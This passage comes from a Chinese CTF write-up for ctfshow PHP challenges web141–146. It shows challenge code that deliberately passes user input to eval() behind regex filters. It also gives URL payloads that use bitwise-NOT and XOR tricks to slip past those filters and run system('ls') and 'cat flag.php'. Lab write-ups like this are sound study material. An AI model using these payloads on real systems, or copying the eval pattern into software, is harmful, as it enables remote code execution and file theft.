data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$v3</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^\\W+$/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span>  <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"return <span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span> = \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>if (preg_match ('/^\\W+$/', $v3)) 这里只能使用符号，相当于无参 rce</p>\n<pre><code>v1=1&amp;v2=2&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%93%8C);\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218195950435.png\" alt=\"image-20230218195950435\" /></p>\n<pre><code>?v1=1&amp;v2=2&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F);\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218200028622.png\" alt=\"image-20230218200028622\" /></p>\n<h2 id=\"web142\"><a class=\"anchor\" href=\"#web142\">#</a> web142</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$d</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x36d</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x36d</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x36d</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x36d</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x36d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>?v1=0\n</code></pre>\n<p>果然是难度 0</p>\n<h2 id=\"web143\"><a class=\"anchor\" href=\"#web143\">#</a> web143</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$v3</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'get out hacker!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span>  <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"return <span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span> = \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>和 web141 一样使用无参 rce，就是加上了一些限制，但是没有过滤 ^, 这里使异或绕过即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220180025626.png\" alt=\"image-20230220180025626\" /></p>\n<h2 id=\"web144\"><a class=\"anchor\" href=\"#web144\">#</a> web144</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$v3</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^\\W+$/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span>  <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"return <span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span> = \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token number\">1</span><span class=\"token operator\">?</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">:</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里题目说是上一题的升级版，但是好像更简单？</p>\n<p>v3 的长度唯一，然后再 v2rce</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220180616767.png\" alt=\"image-20230220180616767\" /></p>\n<p>上面的 payload 接着用就行了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220180644671.png\" alt=\"image-20230220180644671\" /></p>\n<h2 id=\"web145\"><a class=\"anchor\" href=\"#web145\">#</a> web145</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$v3</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\>|\\*|\\/|\\^|\\#|\\\"/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'get out hacker!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span>  <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"return <span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span> = \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>emmmmm 加了一些限制但是好像没有过滤取反，接着用就行</p>\n<h2 id=\"web146\"><a class=\"anchor\" href=\"#web146\">#</a> web146</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$v3</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\>|\\*|\\/|\\^|\\#|\\\"/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token 